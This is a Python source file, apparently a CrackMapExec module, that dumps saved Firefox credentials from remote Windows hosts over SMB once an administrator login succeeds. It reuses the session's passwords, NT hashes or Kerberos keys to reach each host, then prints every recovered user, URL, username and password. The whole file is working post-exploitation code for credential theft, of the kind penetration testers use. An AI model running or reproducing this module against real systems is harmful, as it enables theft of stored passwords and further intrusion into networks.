#!/usr/bin/env python3
from dploot.lib.target import Target
from cme.protocols.smb.firefox import FirefoxTriage


class CMEModule:
    """
    Firefox by @zblurx
    Inspired by firefox looting from DonPAPI
    https://github.com/login-securite/DonPAPI
    """

    name = "firefox"
    description = "Dump credentials from Firefox"
    supported_protocols = ["smb"]
    opsec_safe = True  # Does the module touch disk?
    multiple_hosts = True  # Does it make sense to run this module on multiple hosts at a time?

    def options(self, context, module_options):
        """Dump credentials from Firefox"""
        pass

    def on_admin_login(self, context, connection):
        host = connection.hostname + "." + connection.domain
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            use_kcache=use_kcache,
        )

        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(target=target, logger=context.log)
            firefox_triage.upgrade_connection(connection=connection.conn)
            firefox_credentials = firefox_triage.run()
            for credential in firefox_credentials:
                context.log.highlight(
                    "[%s][FIREFOX] %s %s:%s"
                    % (
                        credential.winuser,
                        credential.url + " -" if credential.url != "" else "-",
                        credential.username,
                        credential.password,
                    )
                )
        except Exception as e:
            context.log.debug("Error while looting firefox: {}".format(e))
